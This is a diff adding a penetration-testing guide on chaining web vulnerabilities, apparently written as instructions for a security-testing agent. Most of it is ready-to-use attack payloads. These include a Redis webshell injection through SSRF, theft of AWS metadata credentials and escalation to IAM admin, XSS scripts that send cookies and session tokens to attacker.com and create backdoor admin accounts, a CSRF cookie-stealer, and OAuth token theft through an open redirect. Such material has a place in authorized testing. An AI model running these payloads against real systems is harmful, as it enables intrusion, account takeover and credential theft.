@@ -1,0 +1,418 @@
+<chained_vulnerabilities_guide>
+<title>CHAINED VULNERABILITIES EXPLOITATION</title>
+
+<critical>Vulnerability chaining combines multiple weaknesses to achieve high-impact exploitation. Individual vulnerabilities may seem low-severity in isolation, but when chained together can lead to Remote Code Execution, Account Takeover, or complete system compromise. Testing must identify exploit chains and demonstrate amplified impact.</critical>
+
+<scope>
+- SSRF to RCE chains
+- XSS to Account Takeover
+- IDOR + Information Disclosure combinations
+- Open Redirect to OAuth token theft
+- XXE to SSRF to internal access
+- CSRF + Self-XSS exploitation
+- Privilege escalation chains
+- Authentication bypass to data exfiltration
+</scope>
+
+<methodology>
+1. Map all available attack surfaces and vulnerabilities.
+2. Identify relationships between vulnerabilities.
+3. Design multi-step exploitation paths.
+4. Test each step in the chain independently.
+5. Execute full chain to demonstrate maximum impact.
+6. Document each step with clear reproducibility.
+</methodology>
+
+<ssrf_chains>
+<ssrf_to_rce>
+{% raw %}
+# SSRF to RCE chain:
+
+# Step 1: SSRF vulnerability
+GET /api/fetch?url=http://internal-service:8080/
+
+# Step 2: Discover internal services via SSRF
+# Port scan internal network
+url=http://192.168.1.10:22/
+url=http://192.168.1.10:3306/
+url=http://192.168.1.10:6379/  # Redis
+
+# Step 3: Exploit Redis via SSRF
+# Redis command injection
+url=http://192.168.1.10:6379/%0D%0ASET%20shell%20%22%3C%3Fphp%20system($_GET[%27cmd%27])%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT
+
+# Step 4: Access uploaded shell
+GET /shell.php?cmd=id
+
+# Alternative chain via AWS metadata:
+# SSRF -> AWS metadata -> IAM credentials -> Lateral movement
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+{% endraw %}
+</ssrf_to_rce>
+
+<ssrf_to_cloud>
+{% raw %}
+# SSRF to cloud exploitation:
+
+# Step 1: SSRF to AWS metadata
+url=http://169.254.169.254/latest/meta-data/
+
+# Step 2: Extract IAM role credentials
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role
+
+# Response contains:
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "..."
+}
+
+# Step 3: Use credentials to access AWS services
+aws s3 ls --profile stolen
+aws dynamodb scan --table-name users --profile stolen
+
+# Step 4: Privilege escalation via IAM
+aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+{% endraw %}
+</ssrf_to_cloud>
+</ssrf_chains>
+
+<xss_chains>
+<xss_to_account_takeover>
+{% raw %}
+# XSS to Account Takeover chain:
+
+# Step 1: Stored XSS vulnerability
+POST /api/comments
+{"text": "<script src='https://attacker.com/steal.js'></script>"}
+
+# steal.js payload:
+// Step 2: Steal session tokens
+fetch('/api/user/session', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => {
+    // Step 3: Exfiltrate session
+    fetch('https://attacker.com/log?session=' + data.sessionToken);
+    
+    // Step 4: Change email (account takeover)
+    fetch('/api/user/email', {
+      method: 'PUT',
+      body: JSON.stringify({email: 'attacker@evil.com'}),
+      credentials: 'include'
+    });
+    
+    // Step 5: Trigger password reset to new email
+    fetch('/api/auth/reset-password', {
+      method: 'POST',
+      body: JSON.stringify({email: 'attacker@evil.com'}),
+      credentials: 'include'
+    });
+  });
+
+# Alternative: XSS -> OAuth token theft
+<script>
+  // Steal OAuth token from localStorage/sessionStorage
+  var token = localStorage.getItem('oauth_token');
+  fetch('https://attacker.com/steal?token=' + token);
+</script>
+{% endraw %}
+</xss_to_account_takeover>
+
+<xss_to_admin>
+{% raw %}
+# XSS to admin panel access:
+
+# Step 1: XSS in admin-viewed content
+# (e.g., support ticket, user profile)
+POST /support/ticket
+{"message": "<script src='https://attacker.com/admin.js'></script>"}
+
+# admin.js:
+// Step 2: When admin views, create backdoor account
+fetch('/admin/users', {
+  method: 'POST',
+  body: JSON.stringify({
+    username: 'backdoor',
+    password: 'secret123',
+    role: 'admin'
+  }),
+  credentials: 'include'
+});
+
+// Step 3: Exfiltrate admin session
+fetch('https://attacker.com/admin?session=' + document.cookie);
+
+# Step 4: Login as backdoor admin
+POST /login
+{"username": "backdoor", "password": "secret123"}
+{% endraw %}
+</xss_to_admin>
+</xss_chains>
+
+<idor_chains>
+<idor_info_disclosure>
+{% raw %}
+# IDOR + Information Disclosure chain:
+
+# Step 1: IDOR to enumerate user IDs
+for i in {1..1000}; do
+  curl "https://api.example.com/user/$i/profile"
+done
+
+# Step 2: Discover high-value targets
+# Look for admin users, high-privilege accounts
+{"user_id": 1, "username": "admin", "role": "administrator"}
+{"user_id": 42, "username": "ceo", "role": "executive"}
+
+# Step 3: Information disclosure via IDOR
+GET /api/user/1/api-keys
+GET /api/user/1/payment-methods
+GET /api/user/42/private-documents
+
+# Step 4: Use disclosed information for further attacks
+# API keys -> API abuse
+# Payment data -> Financial fraud
+# Documents -> Social engineering
+{% endraw %}
+</idor_info_disclosure>
+
+<idor_to_takeover>
+{% raw %}
+# IDOR to account takeover chain:
+
+# Step 1: IDOR allows viewing reset tokens
+GET /api/user/123/password-reset-token
+{"token": "abc123xyz"}
+
+# Step 2: Use token to reset other user's password
+POST /api/auth/reset-password
+{"token": "abc123xyz", "new_password": "hacked123"}
+
+# Alternative chain:
+# Step 1: IDOR to modify email
+PUT /api/user/123/email
+{"email": "attacker@evil.com"}
+
+# Step 2: Trigger password reset
+POST /api/auth/forgot-password
+{"email": "attacker@evil.com"}
+
+# Step 3: Receive reset link, takeover account
+{% endraw %}
+</idor_to_takeover>
+</idor_chains>
+
+<open_redirect_chains>
+<redirect_to_oauth_theft>
+{% raw %}
+# Open Redirect to OAuth token theft:
+
+# Step 1: Open redirect vulnerability
+GET /redirect?url=https://evil.com
+
+# Step 2: OAuth flow abuse
+# Normal OAuth flow:
+https://app.example.com/oauth/authorize?
+  client_id=xxx&
+  redirect_uri=https://app.example.com/callback&
+  response_type=token
+
+# Attacker modifies redirect_uri using open redirect:
+https://app.example.com/oauth/authorize?
+  client_id=xxx&
+  redirect_uri=https://app.example.com/redirect?url=https://attacker.com/steal&
+  response_type=token
+
+# Step 3: User authorizes, token sent to attacker
+# Redirect chain:
+# https://app.example.com/callback#access_token=xxx
+# -> https://app.example.com/redirect?url=https://attacker.com/steal#access_token=xxx
+# -> https://attacker.com/steal#access_token=xxx
+
+# Step 4: Attacker uses stolen token
+curl -H "Authorization: Bearer xxx" https://api.example.com/user/data
+{% endraw %}
+</redirect_to_oauth_theft>
+</open_redirect_chains>
+
+<xxe_chains>
+<xxe_to_ssrf_to_rce>
+{% raw %}
+# XXE to SSRF to RCE chain:
+
+# Step 1: XXE vulnerability
+POST /api/xml-import
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-service:8080/">
+]>
+<data>&xxe;</data>
+
+# Step 2: XXE enables SSRF to internal services
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://192.168.1.10:6379/">
+]>
+
+# Step 3: Exploit internal service (Redis) via XXE+SSRF
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://192.168.1.10:6379/%0D%0ASET%20shell%20%22webshell%22%0D%0A">
+]>
+
+# Step 4: Write webshell, achieve RCE
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///var/www/html/shell.php">
+]>
+{% endraw %}
+</xxe_to_ssrf_to_rce>
+</xxe_chains>
+
+<csrf_chains>
+<csrf_self_xss>
+{% raw %}
+# CSRF + Self-XSS chain:
+
+# Step 1: Self-XSS vulnerability
+# XSS that only works if victim pastes payload
+# Alone: Not exploitable (requires user interaction)
+
+# Step 2: CSRF vulnerability
+# Can modify user profile without CSRF token
+POST /api/profile
+{"bio": "User biography"}
+
+# Step 3: Chain CSRF + Self-XSS
+# Use CSRF to inject Self-XSS payload into victim's profile
+<form action="https://example.com/api/profile" method="POST">
+  <input name="bio" value="<script>fetch('https://attacker.com/?c='+document.cookie)</script>">
+</form>
+<script>document.forms[0].submit();</script>
+
+# When victim views their own profile: XSS triggers
+# No user interaction needed (CSRF automates it)
+{% endraw %}
+</csrf_self_xss>
+</csrf_chains>
+
+<privilege_escalation_chains>
+<horizontal_to_vertical>
+{% raw %}
+# Horizontal to vertical privilege escalation:
+
+# Step 1: Horizontal privilege escalation (IDOR)
+GET /api/user/100/profile
+# Can view other regular users' profiles
+
+# Step 2: Enumerate to find admin user ID
+GET /api/user/1/profile
+{"id": 1, "username": "admin", "role": "administrator"}
+
+# Step 3: IDOR allows viewing admin's API key
+GET /api/user/1/api-key
+{"key": "admin_secret_key_xxx"}
+
+# Step 4: Use admin API key for vertical escalation
+curl -H "Authorization: Bearer admin_secret_key_xxx" \
+  https://api.example.com/admin/users
+
+# Step 5: Create backdoor admin account
+POST /admin/users
+Authorization: Bearer admin_secret_key_xxx
+{"username": "backdoor", "password": "secret", "role": "admin"}
+{% endraw %}
+</horizontal_to_vertical>
+
+<parameter_pollution>
+{% raw %}
+# Parameter pollution privilege escalation:
+
+# Step 1: Regular user profile update
+PUT /api/user/profile
+{"name": "John Doe", "email": "john@example.com"}
+
+# Step 2: Add role parameter (normally ignored)
+PUT /api/user/profile
+{"name": "John Doe", "email": "john@example.com", "role": "admin"}
+
+# Step 3: Parameter pollution to bypass filtering
+PUT /api/user/profile?user_id=123&user_id=1
+{"name": "Attacker"}
+# First user_id filtered, second used (admin ID)
+
+# Step 4: Verify privilege escalation
+GET /api/user/profile
+{"id": 123, "role": "admin"}
+{% endraw %}
+</parameter_pollution>
+</privilege_escalation_chains>
+
+<common_chains>
+{% raw %}
+# Authentication bypass -> Data exfiltration:
+# 1. Auth bypass via SQL injection in login
+# 2. Access admin panel
+# 3. Export all user data
+
+# File upload -> RCE:
+# 1. Upload PHP file with image extension
+# 2. Path traversal to executable directory
+# 3. Access uploaded file, execute code
+
+# CORS misconfiguration -> Token theft:
+# 1. CORS allows evil.com origin
+# 2. XSS or phishing to evil.com
+# 3. JavaScript fetch with credentials
+# 4. Steal tokens, API abuse
+
+# Race condition -> Business logic bypass:
+# 1. Race condition in payment processing
+# 2. Multiple requests for same discount code
+# 3. Negative balance achieved
+# 4. Withdraw funds (financial fraud)
+{% endraw %}
+</common_chains>
+
+<validation>
+1. Document each step in the chain with clear reproduction.
+2. Show how individual vulnerabilities amplify when combined.
+3. Demonstrate the final impact (RCE, account takeover, data breach).
+4. Prove that fixing one step breaks the chain.
+5. Provide the complete attack scenario with timing and sequence.
+</validation>
+
+<false_positives>
+- Individual vulnerabilities properly mitigated at each step
+- Defense in depth preventing chain completion
+- Rate limiting preventing enumeration steps
+- CSRF tokens blocking automated chains
+- Proper input validation at every stage
+- Network segmentation preventing SSRF exploitation
+</false_positives>
+
+<impact>
+- Complete system compromise via RCE chains
+- Mass account takeover through XSS+token theft
+- Data breach via IDOR+information disclosure
+- Privilege escalation to administrator access
+- Cloud infrastructure compromise via SSRF+metadata
+- OAuth account hijacking via redirect chains
+- Internal network access via XXE+SSRF
+</impact>
+
+<pro_tips>
+1. Map all vulnerabilities before attempting chains.
+2. Test each step independently first.
+3. Look for weak points that connect vulnerabilities.
+4. SSRF is often a key pivot point to internal services.
+5. XSS can be chained with any authenticated action.
+6. IDOR enumeration finds high-value targets for further exploitation.
+7. Open redirects enable OAuth and token theft.
+8. Consider time-based chains (race conditions, session timing).
+9. Document complete reproduction steps for each chain.
+10. Show both the chain and the individual vulnerabilities.
+</pro_tips>
+
+<remember>Vulnerability chains amplify impact beyond individual vulnerabilities. Common chains: SSRF->RCE (via internal services), XSS->Account Takeover (token theft), IDOR->Data Breach (enumeration + access), Open Redirect->OAuth Theft, XXE->SSRF->RCE. Key pivot points: SSRF enables internal access, XSS enables authenticated actions, IDOR enables enumeration and targeting. Always test each step independently, then demonstrate the full chain. Defense requires breaking any single step.</remember>
+</chained_vulnerabilities_guide>
